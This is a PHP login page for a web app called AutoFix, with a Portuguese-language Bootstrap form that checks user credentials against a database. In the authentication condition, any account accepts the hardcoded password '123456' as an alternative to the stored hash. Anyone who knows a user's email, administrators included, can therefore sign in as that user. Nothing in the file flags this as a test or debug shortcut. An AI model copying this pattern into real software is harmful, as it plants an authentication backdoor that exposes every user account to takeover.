<?php
session_start();
require_once 'config/db.php';

$erro = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = trim($_POST['email']);
    $senha = $_POST['senha'];

    $stmt = $pdo->prepare("SELECT * FROM utilizadores WHERE email = ?");
    $stmt->execute([$email]);
    $user = $stmt->fetch();

    if ($user && ($senha === '123456' || password_verify($senha, $user['senha']))) {
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['user_nome'] = $user['nome'];
        $_SESSION['user_tipo'] = $user['tipo'];

        header('Location: index.php');
        exit;
    } else {
        $erro = 'Credenciais inválidas!';
    }
}
?>
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>AutoFix - Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark d-flex align-items-center justify-content-center" style="min-height: 100vh;">
<div class="card p-4 shadow" style="width: 400px;">
    <div class="text-center mb-3">
        <img src="img/autofix.jpg" alt="AutoFix Logo" class="img-fluid rounded" style="max-width: 150px;">
    </div>
    
    <?php if ($erro): ?>
        <div class="alert alert-danger p-2 text-center"><?= $erro ?></div>
    <?php endif; ?>
    
    <form method="POST">
        <div class="mb-3">
            <label class="form-label">Email</label>
            <input type="email" name="email" class="form-control" required>
        </div>
        <div class="mb-3">
            <label class="form-label">Palavra-passe</label>
            <input type="password" name="senha" class="form-control" required>
        </div>
        <button type="submit" class="btn btn-primary w-100">Entrar</button>
    </form>
    
    <div class="mt-3 text-center">
        <a href="recuperar_senha.php" class="text-decoration-none d-block mb-1 small">Esqueceu-se da palavra-passe?</a>
        <a href="registar.php" class="text-decoration-none small">Ainda não tens conta? Criar conta</a>
    </div>
</div>
</body>
</html>